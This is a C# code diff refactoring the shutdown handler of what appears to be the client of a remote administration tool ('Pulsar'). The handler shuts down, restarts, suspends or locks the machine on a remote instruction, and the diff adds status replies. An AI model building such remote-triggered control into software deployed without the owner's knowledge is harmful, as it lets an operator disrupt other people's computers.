@@ -17,12 +17,8 @@ namespace Pulsar.Client.Messages
 
         public void Execute(ISender sender, IMessage message)
         {
-            switch (message)
-            {
-                case DoShutdownAction msg:
-                    Execute(sender, msg);
-                    break;
-            }
+            if (message is DoShutdownAction msg)
+                Execute(sender, msg);
         }
 
         private void Execute(ISender client, DoShutdownAction message)
@@ -38,22 +34,26 @@ namespace Pulsar.Client.Messages
                 switch (message.Action)
                 {
                     case ShutdownAction.Shutdown:
+                        client.Send(new SetStatus { Message = "Client is shutting down..." });
                         startInfo.FileName = "shutdown";
-                        startInfo.Arguments = "/s /t 0"; // shutdown immediately
+                        startInfo.Arguments = "/s /t 0";
                         Process.Start(startInfo);
                         break;
 
                     case ShutdownAction.Restart:
+                        client.Send(new SetStatus { Message = "Client is restarting..." });
                         startInfo.FileName = "shutdown";
-                        startInfo.Arguments = "/r /t 0"; // restart immediately
+                        startInfo.Arguments = "/r /t 0";
                         Process.Start(startInfo);
                         break;
 
                     case ShutdownAction.Standby:
-                        Application.SetSuspendState(PowerState.Suspend, true, true); // sleep/standby
+                        client.Send(new SetStatus { Message = "Client entering standby mode..." });
+                        Application.SetSuspendState(PowerState.Suspend, true, true);
                         break;
 
                     case ShutdownAction.Lockscreen:
+                        client.Send(new SetStatus { Message = "Client screen is being locked..." });
                         Process.Start(new ProcessStartInfo
                         {
                             FileName = "rundll32.exe",
@@ -65,13 +65,13 @@ namespace Pulsar.Client.Messages
                         break;
 
                     default:
-                        client.Send(new SetStatus { Message = "Unknown shutdown action." });
+                        client.Send(new SetStatus { Message = "Unknown shutdown action requested." });
                         break;
                 }
             }
             catch (Exception ex)
             {
-                client.Send(new SetStatus { Message = $"Action failed: {ex.Message}" });
+                client.Send(new SetStatus { Message = $"Shutdown action failed: {ex.Message}" });
             }
         }
     }
